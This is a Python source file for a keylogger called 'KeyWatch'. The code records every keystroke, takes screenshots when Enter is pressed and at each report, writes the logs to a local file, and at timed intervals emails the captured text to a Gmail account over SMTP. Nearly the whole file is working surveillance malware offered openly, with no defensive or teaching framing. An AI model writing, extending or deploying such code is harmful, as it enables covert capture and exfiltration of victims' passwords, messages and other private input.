from pynput.keyboard import Listener
from time import sleep
import threading
import smtplib 
from datetime import datetime
from pynput.keyboard import Key
import mss

### 🛠️ Project: KeyWatch – Advanced Keystroke Logger

class Kelogger:
  def __init__(self, time_interval, email, password, LOG_FILE_PATH):
    # self.log: a variable to store everything that the user writes (temporary registration).
    self.log = "" 
    self.interval = time_interval
    self.email = email
    self.password = password
    self.start_time = datetime.now()
    self.LOG_FILE_PATH = LOG_FILE_PATH

  def process_key_press(self, key):
      """Process each key press and add to log."""
      try:
          self.log += str(key.char)
      except AttributeError:
          if key == Key.space:
              self.log += " "
          elif key == Key.enter:
              self.log += "\n"
              self.take_screenshot()
          elif key == Key.tab:
              self.log += "\t"
          else:
              self.log += f" [{key.name}] "

  def take_screenshot(self):
        """Take screenshot and save with timestamp."""
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"screenshot_{timestamp}.png"
        try:
            with mss.mss() as sct:
                sct.shot(output=filename)
                print(f"[+] Screenshot taken: {filename}")
        except Exception as e:
            print(f"[!] Failed to take screenshot: {e}")
        return filename


  def report(self):
    if len(self.log) > 0:
      timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
      formatted_log = f"\n[+] Log Time: {timestamp}\n{'-'*40}\n{self.log}\n{'='*40}\n"

      # Take Screenshot
      screenshot_file = self.take_screenshot()


      email_content = f"{formatted_log}\nScreenshot saved as: {screenshot_file}"

      # Send via email
      self.send_mail(self.email, self.password, email_content)


      # View in Terminal
      print(formatted_log)

      # (optional) Save to local file
      with open(self.LOG_FILE_PATH, "a", encoding="utf-8") as f:
        f.write(formatted_log)
      

    #  Full-time log.
    self.log = ""
    threading.Timer(self.interval, self.report).start() 

  def send_mail(self, email, password, message):
      """Send logs via email with proper formatting."""
      try:
          server = smtplib.SMTP("smtp.gmail.com", 587)
          server.starttls()
          server.login(email, password)
          subject = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
          email_text = f"Subject: {subject}\nFrom: {email}\nTo: {email}\n\n{message}"
          server.sendmail(email, email, email_text)
          server.quit()
      except Exception as e:
          print(f"Failed to send email: {e}")

  def start(self):
      # Create a listener that monitors keystrokes
      keyboard_listen = Listener(on_press=self.process_key_press)
      # Run the listener and wait for the clicks
      with keyboard_listen:
          self.report()
          keyboard_listen.join() # Wait for the listener to finish listening 

